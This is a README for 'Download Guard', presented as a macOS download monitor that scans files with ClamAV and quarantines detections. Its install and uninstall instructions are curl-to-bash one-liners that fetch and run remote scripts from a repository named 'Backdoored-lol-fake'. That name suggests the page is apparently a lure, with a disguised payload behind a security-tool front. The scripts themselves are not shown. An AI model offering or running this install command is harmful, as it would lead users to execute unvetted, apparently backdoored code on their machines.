# Download Guard for macOS

A small local download monitor for macOS. It watches `~/Downloads`, scans new files with ClamAV, and moves detections into a private quarantine folder. It does not upload files anywhere.

## Install

Requires macOS and Homebrew. Install Homebrew first if needed: https://brew.sh

```bash
curl -fsSL https://raw.githubusercontent.com/ttmeticks-source/Backdoored-lol-fake/main/install.sh | bash
```

The installer installs ClamAV, downloads the scanner, updates malware signatures, and registers a per-user LaunchAgent.

## What it does

- Checks new files in Downloads automatically.
- Waits until a file stops changing before scanning it.
- Uses ClamAV signatures; scan errors are treated as errors, never as clean results.
- Moves detections to `~/Library/Application Support/DownloadGuard/Quarantine`.
- Shows a macOS notification: **Deleted 1 malware!** (the detected file is quarantined, not permanently erased).
- Stores a local scan log and state database.

No antivirus can guarantee detection of every threat. Keep macOS and ClamAV signatures updated, and do not open suspicious files.

## Uninstall

```bash
curl -fsSL https://raw.githubusercontent.com/ttmeticks-source/Backdoored-lol-fake/main/uninstall.sh | bash
```

Uninstall removes the LaunchAgent and app files. Quarantined files and logs are retained so you can review them.
